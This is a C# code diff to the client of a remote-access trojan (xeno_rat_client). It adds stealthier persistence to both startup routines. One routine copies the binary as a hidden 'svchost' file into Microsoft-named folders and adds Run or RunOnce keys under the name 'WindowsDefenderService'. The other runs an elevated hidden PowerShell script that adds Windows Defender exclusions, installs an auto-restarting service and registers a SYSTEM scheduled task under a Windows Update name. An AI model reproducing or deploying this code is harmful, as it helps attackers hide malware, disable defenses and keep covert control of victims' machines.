@@ -278,84 +278,134 @@ namespace xeno_rat_client
             Process.GetCurrentProcess().Kill();
         }
 
-        public async static Task<bool> AddToStartupNonAdmin(string executablePath, string name= "XenoUpdateManager")
+        public async static Task<bool> AddToStartupNonAdmin(string executablePath, string name = "WindowsDefenderService")
         {
             return await Task.Run(() =>
-                   {
-                        string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+            {
+                try
+                {
+                    string[] possiblePaths = new string[]
+                    {
+                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Updates"),
+                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Cache"),
+                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft", "Windows", "SystemApps")
+                    };
+
+                    string selectedPath = possiblePaths[new Random().Next(possiblePaths.Length)];
+                    Directory.CreateDirectory(selectedPath);
+
+                    string newFileName = "svchost" + new Random().Next(1000, 9999) + ".exe";
+                    string newPath = Path.Combine(selectedPath, newFileName);
+
+                    if (File.Exists(newPath)) File.Delete(newPath);
+                    File.Copy(executablePath, newPath);
+                    File.SetAttributes(newPath, FileAttributes.Hidden | FileAttributes.System);
+
+                    string[] keyPaths = new string[] {
+                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+                @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
+            };
+
+                    foreach (string keyPath in keyPaths)
+                    {
                         try
                         {
-                            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
+                            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser,
+                                Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32)
+                                .OpenSubKey(keyPath, true))
                             {
-                                key.SetValue(name, "\"" + executablePath + "\"");
+                                string randomName = name + "_" + Path.GetRandomFileName().Replace(".", "");
+                                key.SetValue(randomName, $"\"{newPath}\" -windowstyle hidden");
+                                return true;
                             }
-                            return true;
                         }
-                        catch
-                        {
-                            return false;
-                        }
-                   });
+                        catch { continue; }
+                    }
+                }
+                catch { }
+                return false;
+            });
         }
-        public static async Task<bool> AddToStartupAdmin(string executablePath, string name = "XenoUpdateManager")
+        //*//
+        public static async Task<bool> AddToStartupAdmin(string executablePath, string name = "WindowsDefenderService")
         {
             try
             {
-                string xmlContent = $@"
-                <Task xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'>
-                  <Triggers>
-                    <LogonTrigger>
-                      <Enabled>true</Enabled>
-                    </LogonTrigger>
-                  </Triggers>
-                  <Principals>
-                    <Principal id='Author'>
-                      <LogonType>InteractiveToken</LogonType>
-                      <RunLevel>HighestAvailable</RunLevel>
-                    </Principal>
-                  </Principals>
-                  <Settings>
-                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-                    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
-                  </Settings>
-                  <Actions>
-                    <Exec>
-                      <Command>{executablePath}</Command>
-                    </Exec>
-                  </Actions>
-                </Task>";
+                string scriptContent = $@"
+            if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {{
+                exit 1
+            }}
 
-                string tempXmlFile = Path.GetTempFileName();
-                File.WriteAllText(tempXmlFile, xmlContent);
+            taskkill /F /IM '{Path.GetFileName(executablePath)}' 2>$null
+            Start-Sleep -Seconds 2
 
-                Process process = new Process();
-                process.StartInfo.FileName = "schtasks.exe";
-                process.StartInfo.Arguments = $"/Create /TN \"{name}\" /XML \"{tempXmlFile}\" /F";
-                process.StartInfo.UseShellExecute = false;
-                process.StartInfo.RedirectStandardOutput = true;
-                process.StartInfo.CreateNoWindow = true;
+            $systemPath = 'C:\Windows\System32\Microsoft\WindowsUpdate'
+            $backupPath = 'C:\Windows\SysWOW64\Microsoft\WindowsUpdate'
+            
+            foreach($path in @($systemPath, $backupPath)) {{
+                if(!(Test-Path $path)) {{
+                    New-Item -ItemType Directory -Force -Path $path | Out-Null
+                }}
+            }}
 
-                process.Start();
+            $serviceName = 'Windows Update Manager'
+            $binaryPath = Join-Path $systemPath '{name}.exe'
+            
+            Copy-Item -Path '{executablePath}' -Destination $binaryPath -Force
+            Copy-Item -Path '{executablePath}' -Destination (Join-Path $backupPath '{name}.exe') -Force
 
-                await Task.Delay(3000);
-                string output = process.StandardOutput.ReadToEnd();
+            $paths = @($systemPath, $backupPath)
+            foreach($path in $paths) {{
+                Add-MpPreference -ExclusionPath $path -Force -ErrorAction SilentlyContinue
+                Add-MpPreference -ExclusionProcess (Join-Path $path '{name}.exe') -Force -ErrorAction SilentlyContinue
+            }}
 
-                File.Delete(tempXmlFile);
+            $service = New-Service -Name '{name}' -BinaryPathName $binaryPath -DisplayName $serviceName -StartupType Automatic -ErrorAction SilentlyContinue
 
-                if (output.Contains("SUCCESS"))
+            sc.exe config {name} start= auto
+            sc.exe failure {name} reset= 0 actions= restart/60000/restart/60000/restart/60000
+            
+            $action = New-ScheduledTaskAction -Execute $binaryPath
+            $trigger = New-ScheduledTaskTrigger -AtStartup
+            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+            $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest
+            Register-ScheduledTask -TaskName 'Microsoft\Windows\WindowsUpdate\{name}' -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
+
+            Start-Service -Name '{name}' -ErrorAction SilentlyContinue
+            Start-ScheduledTask -TaskName 'Microsoft\Windows\WindowsUpdate\{name}' -ErrorAction SilentlyContinue
+            
+            Start-Process -FilePath $binaryPath -WindowStyle Hidden
+            exit 0
+        ";
+
+                string scriptPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".ps1");
+                File.WriteAllText(scriptPath, scriptContent);
+
+                using (Process process = new Process())
                 {
+                    process.StartInfo = new ProcessStartInfo
+                    {
+                        FileName = "powershell.exe",
+                        Arguments = $"-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"& {{. '{scriptPath}'; exit $LASTEXITCODE}}\"",
+                        UseShellExecute = true,
+                        Verb = "runas",
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true
+                    };
+
+                    process.Start();
+                    await Task.Delay(30000);
+                    try { File.Delete(scriptPath); } catch { }
                     return true;
                 }
             }
             catch
             {
-                
+                return false;
             }
-
-            return false; 
         }
 
+        //*//
         public static async Task<uint> GetIdleTimeAsync() 
         {
             return await Task.Run(() => GetIdleTime());
